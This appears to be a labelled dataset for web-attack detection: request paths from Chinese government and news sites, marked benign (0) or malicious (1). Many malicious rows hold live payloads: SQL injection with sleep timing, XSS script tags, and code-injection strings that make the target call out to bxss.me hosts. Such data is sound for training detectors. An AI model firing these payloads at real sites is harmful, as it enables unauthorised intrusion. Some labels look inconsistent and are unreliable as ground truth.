request	label
/****/zt/nlkfxjjsyq/syqdt/index_4.html	0
/****/0119/684350.shtml	0
/*******/qiye/20211202/e141959106.html	0
/****/gcjx/201411/w020141125639037134887.jpg	0
/****/hssd	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u5f65\u9759\u7406\u53d1\u5e97	0
/****/xqldly/hfhnsj/zmhdyc_5.html	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u4f4e\u6e29	0
/****/xydt/2012hydt/201412/t20141218_46958.html	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u9ec4\u6e20\u6865\u9547\u798f\u6e90\u7f8a\u7f94\u8089\u9910\u5385	0
/*****/system/2009/11/06/010001355.shtml	1
/**********/system/2021/07/30/013427857.shtml	0
/***/0/02/12/41/2124121_622174.jpg	0
"/****/zzxxgk/tjj<esi:include src=""""http://bxss.me/rpb.png""""/>/zfxxgkml_2127/jgzn_2042/list.html"	1
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u516c\u7acb\u533b\u9662	0
/**************/newscenter/system/2021/12/20/013496835.shtml	0
/**********/system/2021/12/05/javascript:window.close();	1
"/' 'a'.concat(70-3).concat(22*4).concat(106).concat(83).concat(98).concat(90) (require'socket'
socket.gethostbyname('hitgd' 'eaxlmurd048e0.bxss.me.')[3].to_s) '/********/jcse/110105008056111/16/images/searchbtn.js"	1
/****/zzxxgk/bmsthjj/xxgkml/hjxx/hjwfbgt/202101/t20210108_176009.html	0
"/***/col200/index"""" and 2*3*8=6*8 and """"j7rs""""=""""j7rs.html"	1
/****/mtgz/2021_mtgz/202105/t20210505%' and 2*3*8=6*8 and 'byrn'!='byrn%_273338.html	1
/********/pdf-generic/build/pdf.js	0
/******/?q=extractvalue(1,concat(char(126),md5(1747840203)))&scope=1&x=13&y=18	1
/****/bmkx/sgaj/201805/w020180515621856940243.jpg	0
/****/if(now()=sysdate(),sleep(12),0)/leader/mhw.htm	1
"/****/xxgkzd/list.html?new="""" """"a"""".concat(70-3).concat(22*4).concat(97).concat(68).concat(113).concat(79) (require""""socket""""
socket.gethostbyname(""""hitpm"""" """"gigdbsvk692d3.bxss.me."""")[3].to_s) """""	1
/************/interfaces/autocomplete.do?begin=20201023&end=20211023&eq=if(now()=sysdate(),sleep(15),0)&oq=1&p=1&pg=1&pos=filenumber&pq=&q=请输入关键词&searchid=44&tpl=16&websiteid=110105008056111	1
/***/interface/daily_clickcount.json.jsp?callback=jquery19107085147621990586_1640024989235	0
/zwxx_11337/****/202002/t20200208_1946833.html	0
"/**/ui/lib/easyui/themes/"""" """"a"""".concat(70-3).concat(22*4).concat(100).concat(88).concat(100).concat(73) (require""""socket""""
socket.gethostbyname(""""hitef"""" """"sgnquscha8796.bxss.me."""")[3].to_s) """"/linkbutton.css"	1
"/****/form.jspx?id=1060&channelid="""";window.top._web_js_namespace_taint_tracer.log_execution_flow_sink()"""""	1
"/****/ccpc公众站轿车组?page=1'""""()&%<acx><script >mw0b(9210)</script>"	1
/***/0/01/93/43/1934394_670626.jpg	0
/zwxx_11337/****/202005/t20200515_2091251.html	0
/**********/system/2021/11/09/013477540.shtml	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u4e09\u8425\u9547\u5c0f\u5218\u6c7d\u914d\u4fee\u7406	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtauyek2ev/rnlnpqtlpinxu=&openid=ovl7jjqvcvridg4yt7bh9uogr37s&outer_str=quicklyrq,3,64772,369069&activate_ticket=fdzv9emqaffrnr3xboqhb7ya6h64dejwq07tazxbhk7oo8dbj5 fzedtzplsmcarxvioeup9q6wjeq/7lecrlkyv1t6qqu2nnvhqwjd87ls=	0
/****/qzfwj/201902/t20190227_1293056.html	0
"/************/interfaces/dimension.do?"""".gethostbyname(lc(""""hitiv"""".""""bpjwpcrb396ce.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(105).chr(77).chr(116).chr(67)."""""	1
/***/getsubject?vno=3.5.0×tamp=1640035757905&	0
/************/search.do?begin=20201023&end=20211023&eq=1&oq=1&p=1&pg=if(now()=sysdate(),sleep(15),0)&pos=filenumber&q=请输入关键词&searchid=1&tpl=16&websiteid=110105008056111	1
/****/b-e612937.html	0
"/****/gfxwj/202008/"">\u5b81\u590f\u516c\u8def\u5efa\u8bbe\u7ba1\u7406\u5c40</a>"	0
/***/0/01/51/57/1515752_886110.jpg	0
/****/202104/t20210421_272876.html	0
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqsthjt	0
/****/20200919/e107007783.html	0
"/****/一带一路新华丝路新华丝路数据库?page=1'""""()&%<acx><script >vcdm(9011)</script>"	1
/**/system/2020/11/17/012091049.shtml	0
/zwxx_11337/****/201911/t20191101_1836140.html	0
/****/bwcx/xxyd/gdpl/index_1.html	0
/****/phppressrelease/administration.php?pageaction=saverelease&subaction=submit&dateday=&datemonthnewedit=&dateyearnewedit=&title=<script>alert('777')</script>&summary=deneme&releasebody=deneme&categorynewedit=1&publish=active	1
/****/czgk/bmyjs/zzqjcyxt/gysrmjcy	0
/****/system/2021/08/27/javascript:window.print()	1
/******/system/2021/03/15/javascript:void(0);	1
/**********/system/2015/11/09/011859439.shtml	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u9526\u4f08\u5802\u517b\u751f\u4f1a\u6240	0
/***/0/01/92/33/1923341_141515.jpg	0
/****/system/more/13635020000000000/0000/13635020000000000_00000004.shtml	0
"/****/bysrd/201611/t20161129_78961.html?leader="""" """"a"""".concat(70-3).concat(22*4).concat(102).concat(85).concat(104).concat(74) (require""""socket""""
socket.gethostbyname(""""hitay"""" """"ldklknhtaa5e0.bxss.me."""")[3].to_s) """""	1
/************/risk-disclosure/if(now()=sysdate(),sleep(3),0)-03-16/673.html	1
/****/zjb	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u8d44\u91d1\u652f\u6301	0
/******/web/jpage/theme/simple/css/bxss.me.css	1
/****/1009/245682.shtml	0
/*****/system/2012/10/15/010919318.shtml	0
/**/system/2008/03/10/002441935.shtml	0
/***/003/004/490/00300449084_1c1b5f42.jpg	0
/zwxx_11337/****/201710/t20171013_516228.html	0
/****/xxgkml/qtfdxx/zcjd/qwjd/201902/t20190215_114499.html	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u5473\u9601\u671d\u62c9\u9762\u9986	0
/****/1174/1963.htm	0
/*****/videolist771.html	0
/**/system/2021/07/11/012179332.shtml	0
/****/zsrc/goods.list.html?key=or 1=1 --	1
/***/minip/yunqi/aeym.png	0
/art'||'/****/7/12/art_35_234319.html	1
/***/0/00/27/75/277516_963409.jpg	0
"/******/jslib/ckplayer/ckplayer.js/""><script>alert(4915)</script>?_=1630312208964"	1
/************/template/jcse/110105008056111/16/images/plugin/mainframe/css'||'.css	1
/****/jjgz/202102/w020210201614263572179.png	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u6052\u9686\u96c6\u56e2	0
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u6e05\u65fa\u5546\u5e97	0
/****/shgc/	0
/***/mobile_h5/waparticledetail.do?article_id=201911120951261035&contenttype=article	0
/****/web/search?channelid=222832&searchword=\u539f\u5dde\u533a\u4e09\u8425\u9547\u65b0\u4e09\u8425\u6751\u7535\u5b50\u5546\u52a1\u670d\u52a1\u7ad9	0
/****/zzxxgk/liangshiju/zfxxgkzn_3746/list.html?new=0.1339220516919597	0
/****/zdlygk' and 2*3*8=6*8 and 'ituq'='ituq/ncwywfgz/ycs/lws/xmb_gzdxb.htm	1
/****/blcx	0
/****/zt/msss/msxw/201907/t20190724_1626078.html	0
/**************/cms/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u597d\u83b1\u575e	0
/**********/system/2021/12/09/013492241.shtml	0
"/' 'a'.concat(70-3).concat(22*4).concat(107).concat(72).concat(97).concat(78) (require'socket'
socket.gethostbyname('hitqh' 'dsjzyrdx0dfdb.bxss.me.')[3].to_s) '/*****/hfswsj/202109/t20210906_186411.html"	1
/******/jslib' and 2*3*8=6*8 and '5kmy'='5kmy/urite/urite.min.js	1
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u4e50\u4fe1\u4ed8\u4fe1\u606f\u670d\u52a1\u90e8	0
/****/web/search?channelid=222832&searchword=\u60e0\u519c\u533a\u9769\u677e\u9aa8\u9ad3\u5305\u5b50\u94fa	0
"/***/getsubject?data={""subject_id"":162,""channel_type"":10,""page"":1,""page_size"":15,""account_id"":4250,""sign"":""""}"	0
/zwxx_11337/****/202007/t20200706_2154865.html	0
"/******/dorg/results.php?q='""--></style></script><script>alert(777)</script>&search=search&type=3"	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u5f18\u6cf0\u77f3\u6cb9\u8bbe\u5907\u7ecf\u9500\u90e8	0
/****/gjjj/201903/t20190328_206042.html	1
/******/xsd/spbd	0
/**********/system/2020/09/17/013249265.shtml	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u4e0a\u4e30\u5546\u884c	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u6768\u548c\u9547\u826f\u4f0a\u658b\u7f8a\u8089\u6ce1\u998d	0
/***/blockdata/getsearchinfo.do?&title=\u589e\u903e	0
/***/viewspace-170.html	0
/****/byyw/202112/t20211210_197637.html	0
/****/qzfwj/5619/5633/index.html	1
"/zwxx_11337/*******/202012/"">\u81ea\u6cbb\u533a\u7164\u70ad\u5730\u8d28\u5c40</a>"	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u65b9\u8001\u7956\u533b\u7597\u5668\u68b0\u7ecf\u9500\u90e8	0
/****/jtdt/jt17/201812/t20181210_198447.html	0
/*****/system/2020/11/21/javascript:window.close();	1
/****/web/search?channelid=222832&searchword=\u9686\u5fb7\u53bf\u6cf1\u6cf1\u6570\u7801\u7167\u76f8	0
/********/ziyuan/	0
/***/0/01/38/31/1383110_268959.jpg	1
/****/bmkx/srsj/202005/t20200529_167120.html	0
"/****/web/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15 if(now()=sysdate(),sleep(0),0)/*'xor(if(now()=sysdate(),sleep(0),0))or'""""xor(if(now()=sysdate(),sleep(0),0))or""""*/&outlinepage=10"	1
/****/xxczh1/if(now()=sysdate(),sleep(12),0)/10.htm	1
/****************/notification?access_token=dc85d650-3e5d-4c67-b6e5-60778aa08bad&id=undefined	0
/****/zfxxgk/fdzdgknr/tjxx_40901/zxfb/202006/t20200630_2149595.html	0
/****/wdsjs' and 2*3*8=6*8 and 'ymjr'='ymjr/hfswsj/	1
/**/system/2021/11/23/012224721.shtml	0
/****/20200530/e101542360.html	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u671b\u8fdc\u9547\u4f1f\u624d\u4e94\u91d1\u5efa\u6750\u7ecf\u9500\u90e8	0
/***/blockdata/getsearchinfo.do?&title=\u77f3\u6750	0
/****/zt/yqfkzccs/sjzccs/index_7.html	0
/***/003/004/496/00300449692_2d3a22f4.jpg	0
/****/zfxxgk/fdzdgknr/zdxm/	0
"/****/czgk/bmyjs/rmtt/fl/"">\u81ea\u6cbb\u533a\u7164\u70ad\u5730\u8d28\u5c40</a>"	0
/**********/system/2021/12/03/013489640.shtml	0
/******/system/2018/07/21/javascript:window.print()	1
/**********/system/2020/06/30/013195100.shtml	0
/****/tusby/tcgy/201610/w020161027294493553224.jpg	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u7389\u5e73\u6c7d\u8f66\u4fee\u7406\u90e8	0
/****/czgk/bmyjs/zzqzfzcbmyzstsjg/zzqrlzyshbzt/201702/t20170210_317910.html	0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u8001\u57ce\u533a\u539f\u5473\u65e9\u9910\u5e97	0
/******/usercenter/index?qrcode=quicklyrq,3,162512,56148&code=031gts0w3fs0fx2aq50w3aodpi3gts0-	0
/***/thumb.php?src=<body onload=alert(777)>.jpg	1
/***/2019/10/14/art_75_189732.html	0
"/**/main/admin/course_category.php?action=add&category=""""/><script>confirm(777)</script>"	1
/***/interface/comul_total.json.jsp?callback=jquery191010938776113368442_1639980086742	0
/******/bxss.me/1905211146429566.js	1
/****/qzfwj/?id=5624	0
/****/20180720/post009.php	1
/**********/system/2021/06/17/javascript:void();	1
/**********/system/2020/04/29/013151523.shtml	0
"/****/byszf/sz<esi:include src=""""http://bxss.me/rpb.png""""/>/202108/t20210806_185416.html"	1
/****/system/2021/04/27/013376343.shtml	0
/****/jgzn/leader/mhw'||'.htm	1
/****/xqdt/jtx/201908/t20190809_140922.html	0
/**********/system/2021/05/23/013389941.shtml	0
/****/b-e895859.html	0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u6d77\u57ce\u9547\u4e1c\u6e90\u6c7d\u4fee\u4e2d\u5fc3	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtllwo8vn6ndjoegc3bxk8je=&openid=ovl7jjgcwohukugjcar-2fn8w1t8&outer_str=37896&activate_ticket=fdzv9emqaffrnr3xboqhb4bthnyrdaz7ztzwuwoxih1hfifidrt1ejnprxbtx1zv8xv1zudbua7cfg4azqybhzmc6gsi7t3plkzjgkhxbue=	0
/*****/system/2016/05/12/012003232.shtml	0
/****/20210302/e117371896.html	0
/**********/system/2016/09/10/012125887.shtml	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u671b\u8fdc\u9547\u6da6\u5b87\u8282\u704c\u6750\u6599\u7ecf\u9500\u90e8	0
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u6d2a\u5e7f\u9547\u5c0f\u95eb\u8336\u53f6\u5e97	0
/zwxx_11337/****/202103/t20210315_2626880.html	0
/***/blockdata/getsearchinfo.do?&title=\u6842\u6797\u6842\u6797\u6ee1\u610f\u5ea6	0
/***/interface/daily_clickcount.json.jsp?callback=jquery19101826761625873159_1640016343414	0
/*****/index.php	1
/**********/system/2021/08/18/013436660.shtml	0
/*******/js/anmiate.js	1
/*****/gy48/ljcpgyview.asp?id=40547532&l2=\ufffd\ufffd\u027d&l=\ufffd\u3dab	0
/******/icon01.png	0
"/****/cometchat/plugins/handwrite/index.php?id="""">alert(777)"	1
/******/usercenter/index?qrcode=93963&code=031zjlml29lpl849ygol2oxxc11zjlmf	0
/****/sbjgcjsyjzx/	0
/****/xxczh1/ywdt' and 2*3*8=6*8 and 'hrxl'='hrxl/11.htm	1
/**********/system/2020/05/30/013173972.shtml	0
/****/dqgz/201904/t20190403_206333.html	0
/*******/qiye/b-e2543685.html	0
/****/xqdt/jtx/201610/t20161025_43675.html	0
/**********/system/2021/11/06/javascript:void();	1
/****/xqdt/jyx/201610/t20161025_47897.html	0
/****/d10cv6-hynews-e109218793.html	0
/system%' and 2*3*8=6*8 and 'dsuc'!='dsuc%/********/js/vsb_news_search.js	1
/**/news/	1
/zwxx_11337/****/index_27.html	0
/****/qzfwj/202105/t20210510_2832299.html	0
/**********/system/2020/04/05/013132324.shtml	0
/****/category/silugonggao?page=1</script><script>2apm(9316)</script>	1
/**/system/2021/09/30/012204365.shtml	0
/****/xqdt/byq/201712/t20171225_98365.html	0
/******/index.aspx?kwd=\u052d\u013e\ufffd\ufffd\u013e\ufffd\ufffd	0
/***/003/000/596/00300059695_8210ce51.jpg	0
/******/logo_pg.png	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u7ea2\u53e3\u8336\u697c	0
/***/interface/url_total_pv.json.jsp?callback=jquery191021818175595175626_1639972858303	0
/******/nxrq_priv_idcardbg_4.png	0
/**********/system/2021/11/18/013481854.shtml	0
/**********/system/2021/10/22/013468579.shtml	0
/***/003/004/279/00300427929_2642f2b0.jpg	0
"/****/czgk/bmjs/rmtt/fxh/\""javascript:void(0)\"""	1
/****/kycg/zscq/	1
"/******/cms/www/201709/12165051x0ky.jpg/*/-->'""""></iframe></script></style></title></textarea><script >alert(39161)</script>"	1
/*******/qiye/b-e1320560.html	0
/*****/system/2015/12/23/011895540.shtml	0
/**********/system/2021/04/02/013361791.shtml	0
/***/interface/daily_clickcount.json.jsp?callback=jquery111106006954478578139_1639980318394	0
/zwxx_11337/****/202110/t20211022_3101783_zzb.html	0
/******/api/alert(777)	1
"/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/******/gytdsdfwzs/zzq/zcwj.htm"	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u82ae\u5a1c\u751f\u6d3b\u7f8e\u5bb9\u9986	0
/****/general/diary/new/submit.php	1
/****/rsrm/201701/w020170728623043955017.jpg	0
/****/ygzpxx/201811/t20181126_197777.html' and 'x'='y	1
/***/app?adminemail=<script>alert(777)</script>&smtpserver=127.0.0.1&smtpport=25&smtpuser=<script>alert(777)</script>&smtppassword=admin&smtpsecurity=none&proceedbutton=save&operation=config&st=savesmtp	1
/**/javascript:void(0);	1
/****************/file/loadimage/?id=c5f292d4-15e1-41db-96a7-6a2936b97c27	0
/****/state/service/166/exec	1
"/******/mswpmm/common/signin.aspx?cbautosignin=""""alert(777)"	1
/************/categorysearch.do?cateid=1&eq=1&oq=1&p=1&pg=15&pos=1&pq=1&q=请输入关键词&ranksign=1&searchid=1&total=1&tpl=bxss.me&websiteid=110105008056111	1
/if(now()=sysdate(),sleep(12),0)/****/wjdc.htm	1
/*******/201906021152044918	0
"/***/reviews/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login="""">alert(/777/)&assignee_login=&false_positives=without&sort=&asc=false&commit=search"	1
/****/bmkx/sfgw/201911/w020191129651435747392.jpg	0
/****/90000.php	1
/****/gcsg	0
/****/20200530/e101652877.html	0
/**************/cms/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u6587\u660e\u57ce\u5e02	0
/**********/system/2021/10/25/013469803.shtml	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u7206\u6b3e\u8000\u773c	0
/*******/qiye/businesses-e19850_4.html?category_id=232412	0
/***/images/msb.jpg	0
/**********/system/2021/12/17/013496095.shtml	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u5c0f\u8303\u8f6e\u80ce\u4fee\u7406\u90e8	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u674e\u5a1c\u65b0\u4e16\u7eaa\u7f8e\u53d1\u5e97	0
/*******/zwgk/czgk/bmjs/rmtt/tw/	0
"/************/'""""()&%<acx><script >3uc3(9946)</script>/jcse/110105008056111/16/images/ui.css"	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u7f8e\u9c9c\u4e50\u5546\u8d38\u6709\u9650\u516c\u53f8	0
/**/mediacenter/specials/smiiceibz/index_6.html	0
"/****/bysw/201907/t20190702_139172.html?leader="""" """"a"""".concat(70-3).concat(22*4).concat(107).concat(74).concat(102).concat(85) (require""""socket""""
socket.gethostbyname(""""hitcf"""" """"ujiknorw77c54.bxss.me."""")[3].to_s) """""	1
/***/0/10/81/92/10819226_299010.jpg	0
/****/yd	0
/zwxx_11337/****/202103/t20210318_2630797_zzb.html	0
/****/system/2020/04/15/013140752.shtml	0
/***/weixin/getconf?url=https:/xhn-wap.hinews.cn/news_details.html?from=androidapp&id=1252899&version=3.6.0	0
/****/gwyxx/31.htm	1
/****/wdsjs/bxss.me/	1
/**********/system/2021/12/20/013497299.shtml	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u6021\u6797\u8431\u8d85\u5e02	0
"/**/ui/widgets/"""" """"a"""".concat(70-3).concat(22*4).concat(115).concat(71).concat(119).concat(85) (require""""socket""""
socket.gethostbyname(""""hitit"""" """"ikvhmter40cf6.bxss.me."""")[3].to_s) """"/css/themes/image.css"	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u9501\u7537\u670d\u9970\u5e97	0
/****/bmkx/sfpb/202007/t20200708_169058.html	0
/******/public/2021/11/28/20211128_17d6694733f_r1_1200k.mp4	0
/****/jjdytpgjz_3373	0
/****/jtdt/2012jtdt/201412/jquery.la.min.js	0
/****/b-e1216437.html	0
/system%' and 2*3*8=6*8 and 'iyff'!='iyff%/********/js/news/mp4video.js	1
/**********/system/2020/09/02/013238669.shtml	0
/**********/system/2020/05/06/013155334.shtml	0
/jsearchfront'||'/********/jcse/110105008056111/16/images/catesearchbtn.js	1
/****/whhd/202012/t20201224_268349.html' and 'x'='x	1
/**********/system/2021/12/15/013494579.shtml	0
/***/nbhd/opengovmsgbox.do?method=viewgovmsgbox&siteid=115&metadataid=10062596	0
/***/index.php?title=acunetixtest506957&action=submit	1
/****/whs/yw_1286/201610/t20161024_314520.html	0
/***/0/01/75/28/1752885_382228.png	0
/****/xxgkml/qtfdxx/ssjygk/sjccjg/202101/t20210112_176111.html	0
/**/system/2021/11/07/012217380.shtml	0
/**********/system/2021/12/20/013497378.shtml	0
/******/system/2016/09/13/012129663.shtml	0
/******/usercenter/index?qrcode=9787	0
/****/system/2009/07/27/002781610.shtml	0
/**********/system/2021/12/09/javascript:window.print()	1
/******/system/2011/02/16/010289316.shtml	0
/****/20210506/9789.html	0
"/***/getsubject?data={""subject_id"":147,""channel_type"":10,""page"":1,""page_size"":15,""account_id"":437,""sign"":""""}"	0
/**********/system/2021/01/26/013326179.shtml	0
/****/b-e1032508.html	0
/****/jtdt/jt16/201612/t20161222_114720.html	0
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(675)"">?_=1630311547744"	1
/****/zzxxgk/tjj/http://bxss.me/t/fit.txt?.jpg_2127/jgzn_2042/list.html	1
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u8c03\u7ea2\u6cb9\u574a	0
/*******/khlv4x.php	1
/******/system/2017/11/22/javascript:window.print()	1
/*******/1jx.php	1
"/******/jslib/ckplayer/ckplayer.js/""><script>alert(4618)</script>?_=1630312083348"	1
/*****/gy48/cpgyss.asp?key=3p\u5f00\u653e\u5f0f\u6c34\u51b7\ufffd?&l=\ufffd\ufffd\ufffd\ufffd	0
/**********/system/2015/11/03/011855740.shtml	0
/****/0713/200588.shtml	0
/****/szxx/	0
/zwxx_11337/****/202001/t20200123_1932347.html	0
/*****/system/2016/05/19/012009010.shtml	0
/******/22/bxss.me.css	1
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u57ce\u7406\u53d1\u5e97	0
/****/zgsdt/zgs16/201609/t20160907_98967.html	0
/**********/system/2021/06/17/013403911.shtml	0
/**/system/2021/12/16/012230640.shtml	0
/******/toumingdianji.png	0
/****/xxgkml/qtfdxx/zdjcyjzj/202009/t20200923_172555.html	0
/******/rss/rssfeed.jsp?colid=34);select pg_sleep(5)--	1
/****/xqldly/hfbyqz/202007/t20200731_170136.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u4e2a\u4f53\u7ecf\u8425\u8054\u65b0\u529e\u516c\u7528\u54c1\u5e97	0
/******/system/2011/02/22/010293243.shtml	0
/**********/system/2021/12/09/013492268.shtml	0
/******/zxft.css	0
/****/qzfwj/202001/t20200115_1922752.html	0
/**/index.php?do=post&id=348&c=dt&a=goods&	1
/****/zcwjk/gcjsbz_sjbz' and 2*3*8=6*8 and 'x3wy'='x3wy/1.htm	1
/***/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u6587\u65c5	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u4e1c\u6d77\u51ef\u827a\u5546\u8d38\u6709\u9650\u516c\u53f8	0
"/***/learn/ostickrc/scp/tickets.php?a=export&h=9c2601b88c05055b51962b140f5121389&status="" onmouseover=""alert(777)"""	1
/****/20200617/e102406357.html	0
/****/sj1/tjxx	0
/****/wdsjs/'.gethostbyname(lc('hitgy'.'yjdxcxsv3bb08.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(110).chr(82).chr(120).chr(83).'/zmhdyc.html	1
/****/zgsdt/gzxwzgsdt/201412/t20141218_44509.html	0
